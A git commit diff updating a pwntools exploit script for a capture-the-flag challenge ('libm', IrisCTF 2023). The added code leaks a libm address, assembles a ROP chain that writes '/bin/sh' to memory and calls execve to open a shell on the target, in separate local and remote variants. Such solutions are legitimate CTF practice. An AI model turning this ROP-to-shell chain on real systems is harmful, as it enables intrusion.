fce4137a312da77a0e76a1b2611fe32b2e5395ef
Alex Schmith <alexanderschmith@protonmail.com>
2025-03-22 12:57:58 -0400

    redid some chals that werent saved

--- irisctf_2023/libm/ret2libm.py
+++ irisctf_2023/libm/ret2libm.py
@@ -9,7 +9,7 @@ context.update(
         log_level="debug",
         os="linux",
         #terminal=["tmux", "split-window", "-h", "-p 65"]
-        terminal=["st"]
+        terminal=["ghostty", "-e"]
 )
 
 def start(binary):
@@ -28,22 +28,59 @@ def start(binary):
     else:
         return process(binary)
 
-def exploit(p,e,r):
+def exploit(p,e,l):
     pad = b"A" * 16
     p.recvuntil(b"0x")
     libm_leak = int(p.recvline().strip(b"\n"), 16)
 
-    libm_base = libm_leak
+    libm_base = libm_leak - l.sym["fabs"]
+    l.address = libm_base
     log.info(f"Leaked libm base: {hex(libm_base)}")
  
-    # Remote libm 
+    r = ROP(l)
 
-    #libm_base = libm_leak - 0x17f20
-    #pop_rax = libm_base + 0x1a3c8
-    #syscall = libm_base + 0x3f39
-    #libm_test = libm_base + 0x19b28
+    pop_rdi = p64(r.find_gadget(["pop rdi", "ret"])[0])
+    pop_rsi = p64(r.find_gadget(["pop rsi", "ret"])[0])
+    pop_rdx = p64(r.find_gadget(["pop rdx", "ret"])[0])
+    pop_rcx = p64(r.find_gadget(["pop rcx", "ret"])[0])
+    pop_rax = p64(r.find_gadget(["pop rax", "ret"])[0])
+    syscall = p64(r.find_gadget(["syscall"])[0])
 
-    chain = p64(libm_base)
+
+    chain = pop_rax + p64(0x3b)
+
+    if args.REMOTE:
+        # mov dword ptr [rdi], edx; ret
+        writeable_mem = libm_base + 0x39d170
+
+        log.info(f"writing /bin/sh to {hex(writeable_mem)}")
+
+        write_gadget = p64(libm_base + 0x051106)
+        
+        chain += pop_rdi + p64(writeable_mem)
+        chain += pop_rdx + b"/bin/\x00\x00\x00\x00"
+        chain += write_gadget 
+
+        chain += pop_rdi + p64(writeable_mem + 0x4)
+        chain += pop_rdx + b"/sh\x00\x00\x00\x00\x00"
+        chain += write_gadget 
+
+    else:
+        writeable_mem = libm_base + 0xef000
+        #0x0000000000035560 : mov qword ptr [rsi], rdx ; pop rbp ; ret 
+        write_gadget = p64(libm_base + 0x035560)
+
+        log.info(f"writing /bin/sh to {hex(writeable_mem)}")
+
+        chain += pop_rdx + b"/bin/sh\x00"
+        chain += pop_rsi + p64(writeable_mem)
+        chain += write_gadget + b"B" * 8
+
+
+    chain += pop_rdi + p64(writeable_mem)
+    chain += pop_rsi + p64(0)
+    chain += pop_rdx + p64(0)
+    chain += syscall
 
     p.sendline(pad + chain)
     p.interactive()
@@ -53,7 +90,11 @@ if __name__=="__main__":
 
     p = start(file)
     e = context.binary = ELF(file)
-    r = ROP(e)
+
+    if args.REMOTE:
+        l = ELF("./libm-2.27.so")
+    else: 
+        l = ELF("/usr/lib/libm.so.6")
 
 
-    exploit(p,e,r)
+    exploit(p,e,l)
